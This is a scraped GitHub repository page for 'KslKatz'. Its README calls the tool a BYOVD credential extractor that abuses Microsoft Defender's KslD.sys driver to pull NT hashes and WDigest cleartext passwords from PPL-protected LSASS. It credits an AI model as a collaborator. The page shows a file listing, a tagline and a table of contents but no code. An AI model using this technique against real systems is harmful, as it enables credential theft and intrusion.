25, 2026, 1:26 AM EDT">last monthMar 25, 2026</relative-time></span></div><div class="d-flex flex-shrink-0 gap-2"><div data-testid="latest-commit-details" class="d-none d-sm-flex flex-items-center"><span class="d-flex flex-nowrap fgColor-muted f6"><a class="Link--secondary prc-Link-Link-9ZwDx" aria-label="Commit 892895c" data-hovercard-url="/k3nundrum/KslKatz/commit/892895c45d64067e6a94c63a631f0f7193f5201f/hovercard" data-hovercard-type="commit" octo-click="hovercard-link-click" octo-dimensions="link_type:self" aria-keyshortcuts="Alt+ArrowUp" href="https://github.com/k3nundrum/KslKatz/commit/892895c45d64067e6a94c63a631f0f7193f5201f" data-discover="true">892895c</a>&nbsp;·&nbsp;<relative-time tense="past" datetime="2026-03-25T05:26:37.000Z" title="Mar 25, 2026, 1:26 AM EDT">last monthMar 25, 2026</relative-time></span></div><div class="d-flex gap-2"><h2 class="sr-only ScreenReaderHeading-module__userSelectNone__rwWIk prc-Heading-Heading-MtWFE" data-testid="screen-reader-heading">History</h2><a href="https://github.com/k3nundrum/KslKatz/commits/main/" class="prc-Button-ButtonBase-9n-Xk d-none d-lg-flex LinkButton-module__linkButton__nFnov flex-items-center fgColor-default" data-loading="false" data-size="small" data-variant="invisible"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="leadingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-history" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m.427 1.927 1.215 1.215a8.002 8.002 0 1 1-1.6 5.685.75.75 0 1 1 1.493-.154 6.5 6.5 0 1 0 1.18-4.458l1.358 1.358A.25.25 0 0 1 3.896 6H.25A.25.25 0 0 1 0 5.75V2.104a.25.25 0 0 1 .427-.177ZM7.75 4a.75.75 0 0 1 .75.75v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5A.75.75 0 0 1 7.75 4Z"></path></svg></span><span data-component="text" class="prc-Button-Label-FWkx3"><span class="fgColor-default">7 Commits</span></span></span></a><div class="d-sm-none"><button data-component="IconButton" type="button" aria-pressed="false" aria-expanded="false" data-testid="latest-commit-details-toggle" class="prc-Button-ButtonBase-9n-Xk LatestCommit-module__IconButton__mkJr_ prc-Button-IconButton-fyge7" data-loading="false" data-no-visuals="true" data-size="small" data-variant="invisible" aria-labelledby="_r_b_"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-ellipsis" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align: text-bottom;"><path d="M0 5.75C0 4.784.784 4 1.75 4h12.5c.966 0 1.75.784 1.75 1.75v4.5A1.75 1.75 0 0 1 14.25 12H1.75A1.75 1.75 0 0 1 0 10.25ZM12 7a1 1 0 1 0 0 2 1 1 0 0 0 0-2ZM7 8a1 1 0 1 0 2 0 1 1 0 0 0-2 0ZM4 7a1 1 0 1 0 0 2 1 1 0 0 0 0-2Z"></path></svg></button><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="s" aria-hidden="true" id="_r_b_" popover="auto">Open commit details</span></div><div class="d-flex d-lg-none"><a aria-label="View commit history for this file." href="https://github.com/k3nundrum/KslKatz/commits/main/" class="prc-Button-ButtonBase-9n-Xk LinkButton-module__linkButton__nFnov flex-items-center fgColor-default" data-loading="false" data-size="small" data-variant="invisible" aria-describedby="_R_iqj6oql3al1d_"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="leadingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-history" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m.427 1.927 1.215 1.215a8.002 8.002 0 1 1-1.6 5.685.75.75 0 1 1 1.493-.154 6.5 6.5 0 1 0 1.18-4.458l1.358 1.358A.25.25 0 0 1 3.896 6H.25A.25.25 0 0 1 0 5.75V2.104a.25.25 0 0 1 .427-.177ZM7.75 4a.75.75 0 0 1 .75.75v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5A.75.75 0 0 1 7.75 4Z"></path></svg></span></span></a><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="s" role="tooltip" aria-hidden="true" id="_R_iqj6oql3al1d_" popover="auto">7 Commits</span></div></div></div></div></td></tr><tr class="react-directory-row undefined" id="folder-row-0"><td class="react-directory-row-name-cell-small-screen" colspan="2"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="This path skips through empty directories" aria-label=".github/workflows, (Directory)" class="Link--primary" href="https://github.com/k3nundrum/KslKatz/tree/main/.github/workflows" data-discover="true"><span class="react-directory-default-color" data-testid="path-name-segment">.github/</span><span class="" data-testid="path-name-segment">workflows</span></a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colspan="1"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="This path skips through empty directories" aria-label=".github/workflows, (Directory)" class="Link--primary" href="https://github.com/k3nundrum/KslKatz/tree/main/.github/workflows" data-discover="true"><span class="react-directory-default-color" data-testid="path-name-segment">.github/</span><span class="" data-testid="path-name-segment">workflows</span></a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div><div class="react-directory-commit-message"><a data-pjax="true" title="Add MSBuild workflow for building projects" class="Link--secondary" href="https://github.com/k3nundrum/KslKatz/commit/892895c45d64067e6a94c63a631f0f7193f5201f">Add MSBuild workflow for building projects</a></div></div></td><td><div class="react-directory-commit-age"><relative-time tense="past" datetime="2026-03-25T05:26:37.000Z" title="Mar 25, 2026, 1:26 AM EDT">last monthMar 25, 2026</relative-time></div></td></tr><tr class="react-directory-row undefined" id="folder-row-1"><td class="react-directory-row-name-cell-small-screen" colspan="2"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="src" aria-label="src, (Directory)" class="Link--primary" href="https://github.com/k3nundrum/KslKatz/tree/main/src" data-discover="true">src</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colspan="1"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="src" aria-label="src, (Directory)" class="Link--primary" href="https://github.com/k3nundrum/KslKatz/tree/main/src" data-discover="true">src</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div><div class="react-directory-commit-message"><a data-pjax="true" title="Add files via upload" class="Link--secondary" href="https://github.com/k3nundrum/KslKatz/commit/8be5cfbbd4620ea5a44e4582dff6ef005167f706">Add files via upload</a></div></div></td><td><div class="react-directory-commit-age"><relative-time tense="past" datetime="2026-03-24T23:34:05.000Z" title="Mar 24, 2026, 7:34 PM EDT">last monthMar 24, 2026</relative-time></div></td></tr><tr class="react-directory-row undefined" id="folder-row-2"><td class="react-directory-row-name-cell-small-screen" colspan="2"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="KslKatz.sln" aria-label="KslKatz.sln, (File)" class="Link--primary" href="https://github.com/k3nundrum/KslKatz/blob/main/KslKatz.sln" data-discover="true">KslKatz.sln</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colspan="1"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="KslKatz.sln" aria-label="KslKatz.sln, (File)" class="Link--primary" href="https://github.com/k3nundrum/KslKatz/blob/main/KslKatz.sln" data-discover="true">KslKatz.sln</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div><div class="react-directory-commit-message"><a data-pjax="true" title="Add files via upload" class="Link--secondary" href="https://github.com/k3nundrum/KslKatz/commit/8be5cfbbd4620ea5a44e4582dff6ef005167f706">Add files via upload</a></div></div></td><td><div class="react-directory-commit-age"><relative-time tense="past" datetime="2026-03-24T23:34:05.000Z" title="Mar 24, 2026, 7:34 PM EDT">last monthMar 24, 2026</relative-time></div></td></tr><tr class="react-directory-row undefined" id="folder-row-3"><td class="react-directory-row-name-cell-small-screen" colspan="2"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="KslKatz.vcxproj" aria-label="KslKatz.vcxproj, (File)" class="Link--primary" href="https://github.com/k3nundrum/KslKatz/blob/main/KslKatz.vcxproj" data-discover="true">KslKatz.vcxproj</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colspan="1"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="KslKatz.vcxproj" aria-label="KslKatz.vcxproj, (File)" class="Link--primary" href="https://github.com/k3nundrum/KslKatz/blob/main/KslKatz.vcxproj" data-discover="true">KslKatz.vcxproj</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div><div class="react-directory-commit-message"><a data-pjax="true" title="Add files via upload" class="Link--secondary" href="https://github.com/k3nundrum/KslKatz/commit/8be5cfbbd4620ea5a44e4582dff6ef005167f706">Add files via upload</a></div></div></td><td><div class="react-directory-commit-age"><relative-time tense="past" datetime="2026-03-24T23:34:05.000Z" title="Mar 24, 2026, 7:34 PM EDT">last monthMar 24, 2026</relative-time></div></td></tr><tr class="react-directory-row undefined" id="folder-row-4"><td class="react-directory-row-name-cell-small-screen" colspan="2"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="KslKatz.vcxproj.filters" aria-label="KslKatz.vcxproj.filters, (File)" class="Link--primary" href="https://github.com/k3nundrum/KslKatz/blob/main/KslKatz.vcxproj.filters" data-discover="true">KslKatz.vcxproj.filters</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colspan="1"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="KslKatz.vcxproj.filters" aria-label="KslKatz.vcxproj.filters, (File)" class="Link--primary" href="https://github.com/k3nundrum/KslKatz/blob/main/KslKatz.vcxproj.filters" data-discover="true">KslKatz.vcxproj.filters</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div><div class="react-directory-commit-message"><a data-pjax="true" title="Add files via upload" class="Link--secondary" href="https://github.com/k3nundrum/KslKatz/commit/8be5cfbbd4620ea5a44e4582dff6ef005167f706">Add files via upload</a></div></div></td><td><div class="react-directory-commit-age"><relative-time tense="past" datetime="2026-03-24T23:34:05.000Z" title="Mar 24, 2026, 7:34 PM EDT">last monthMar 24, 2026</relative-time></div></td></tr><tr class="react-directory-row undefined" id="folder-row-5"><td class="react-directory-row-name-cell-small-screen" colspan="2"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="KslKatz.vcxproj.user" aria-label="KslKatz.vcxproj.user, (File)" class="Link--primary" href="https://github.com/k3nundrum/KslKatz/blob/main/KslKatz.vcxproj.user" data-discover="true">KslKatz.vcxproj.user</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colspan="1"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="KslKatz.vcxproj.user" aria-label="KslKatz.vcxproj.user, (File)" class="Link--primary" href="https://github.com/k3nundrum/KslKatz/blob/main/KslKatz.vcxproj.user" data-discover="true">KslKatz.vcxproj.user</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div><div class="react-directory-commit-message"><a data-pjax="true" title="Add files via upload" class="Link--secondary" href="https://github.com/k3nundrum/KslKatz/commit/8be5cfbbd4620ea5a44e4582dff6ef005167f706">Add files via upload</a></div></div></td><td><div class="react-directory-commit-age"><relative-time tense="past" datetime="2026-03-24T23:34:05.000Z" title="Mar 24, 2026, 7:34 PM EDT">last monthMar 24, 2026</relative-time></div></td></tr><tr class="react-directory-row undefined" id="folder-row-6"><td class="react-directory-row-name-cell-small-screen" colspan="2"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="ReadMe.md" aria-label="ReadMe.md, (File)" class="Link--primary" href="https://github.com/k3nundrum/KslKatz/blob/main/ReadMe.md" data-discover="true">ReadMe.md</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colspan="1"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="ReadMe.md" aria-label="ReadMe.md, (File)" class="Link--primary" href="https://github.com/k3nundrum/KslKatz/blob/main/ReadMe.md" data-discover="true">ReadMe.md</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div><div class="react-directory-commit-message"><a data-pjax="true" title="Update ReadMe.md" class="Link--secondary" href="https://github.com/k3nundrum/KslKatz/commit/59aa7a6efbd32f8c9c35414011d24cb718658ee0">Update ReadMe.md</a></div></div></td><td><div class="react-directory-commit-age"><relative-time tense="past" datetime="2026-03-25T00:23:44.000Z" title="Mar 24, 2026, 8:23 PM EDT">last monthMar 24, 2026</relative-time></div></td></tr><tr class="d-none DirectoryContent-module__Box_4__RhIsE" data-testid="view-all-files-row"><td colspan="3" class="DirectoryContent-module__Box_5__GaE8N"><div><button class="prc-Link-Link-9ZwDx">View all files</button></div></td></tr></tbody></table></div><div class="OverviewRepoFiles-module__Box_1__OXeac"><div class="OverviewRepoFiles-module__Box_2__zsLGk"><div itemscope="" itemtype="https://schema.org/abstract" class="OverviewRepoFiles-module__Box_3__bBU1C"><h2 class="prc-src-InternalVisuallyHidden-2YaI6">Repository files navigation</h2><button type="button" aria-label="Outline" aria-haspopup="true" aria-expanded="false" tabindex="0" class="prc-Button-ButtonBase-9n-Xk OverviewRepoFiles-module__ActionMenu_Button__OKDYV" data-loading="false" data-size="medium" data-variant="invisible" id="_R_r8ql3al1d_" popovertarget="_R_3r8ql3al1dH1_" style="anchor-name: --anchored-overlay-anchor-_R_3r8ql3al1dH1_;"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-list-unordered" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M5.75 2.5h8.5a.75.75 0 0 1 0 1.5h-8.5a.75.75 0 0 1 0-1.5Zm0 5h8.5a.75.75 0 0 1 0 1.5h-8.5a.75.75 0 0 1 0-1.5Zm0 5h8.5a.75.75 0 0 1 0 1.5h-8.5a.75.75 0 0 1 0-1.5ZM2 14a1 1 0 1 1 0-2 1 1 0 0 1 0 2Zm1-6a1 1 0 1 1-2 0 1 1 0 0 1 2 0ZM2 4a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg></button></div><div class="js-snippet-clipboard-copy-unpositioned DirectoryRichtextContent-module__SharedMarkdownContent__hHXUL" data-hpc="true"><article class="markdown-body entry-content container-lg" itemprop="text"><div align="center" dir="auto">
+<div class="markdown-heading" dir="auto"><h1 tabindex="-1" class="heading-element" dir="auto">KslKatz</h1><a id="user-content-kslkatz" class="anchor" aria-label="Permalink: KslKatz" href="https://github.com/k3nundrum/KslKatz#kslkatz"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto"><strong>BYOVD Credential Extractor using Microsoft Defender's KslD.sys</strong></p>
+<p dir="auto"><a href="https://www.gnu.org/licenses/gpl-3.0" rel="nofollow"><img src="https://camo.githubusercontent.com/48bf9b56d44f38db53ce21294cf0b9487d0a3734ab3ba1fe4c69858ae20db2c1/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d47504c76332d626c75652e737667" alt="License: GPL v3" data-canonical-src="https://img.shields.io/badge/License-GPLv3-blue.svg" style="max-width: 100%;"></a>
+<a href="https://www.microsoft.com/windows" rel="nofollow"><img src="https://camo.githubusercontent.com/0cf4ede85d57646556b6dea2655941495e6d388262895fde824fa5ab6090315f/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f706c6174666f726d2d57696e646f77732d3030373864342e737667" alt="Windows" data-canonical-src="https://img.shields.io/badge/platform-Windows-0078d4.svg" style="max-width: 100%;"></a>
+<a href="https://en.cppreference.com/w/cpp/20" rel="nofollow"><img src="https://camo.githubusercontent.com/4e1cdeb670890e3e206b0019d700d42dc0d47a9190a6a57738e26a439cceeaee/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f432532422532422d32302d3030353939432e737667" alt="C++20" data-canonical-src="https://img.shields.io/badge/C%2B%2B-20-00599C.svg" style="max-width: 100%;"></a>
+<a href="https://visualstudio.microsoft.com/" rel="nofollow"><img src="https://camo.githubusercontent.com/60bad26fb1af76ae3d257ee32f67752a96b26f1fb11f57c3aead37f0c0a78117/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6275696c642d5653323032322d3543324439312e737667" alt="Build" data-canonical-src="https://img.shields.io/badge/build-VS2022-5C2D91.svg" style="max-width: 100%;"></a></p>
+<p dir="auto"><em>Extract MSV1_0 NT hashes and WDigest cleartext passwords from PPL-protected LSASS using only Microsoft-signed components. No third-party driver. Everything ships pre-installed with Windows Defender.</em></p>
+<p dir="auto"><em>Developed in close collaboration with <a href="https://claude.ai/" rel="nofollow">opus</a>.</em></p>
+<hr>
+</div>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Table of Contents</h2><a id="user-content-table-of-contents" class="anchor" aria-label="Permalink: Table of Contents" href="https://github.com/k3nundrum/KslKatz#table-of-contents"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<ul dir="auto">
+<li><a href="https://github.com/k3nundrum/KslKatz#overview">Overview</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#demo-output">Demo Output</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#the-vulnerability">The Vulnerability</a>
+<ul dir="auto">
+<li><a href="https://github.com/k3nundrum/KslKatz#the-read-primitive">The Read Primitive</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#the-access-control">The Access Control</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#the-blocklist-paradox">The Blocklist Paradox</a></li>
+</ul>
+</li>
+<li><a href="https://github.com/k3nundrum/KslKatz#architecture">Architecture</a>
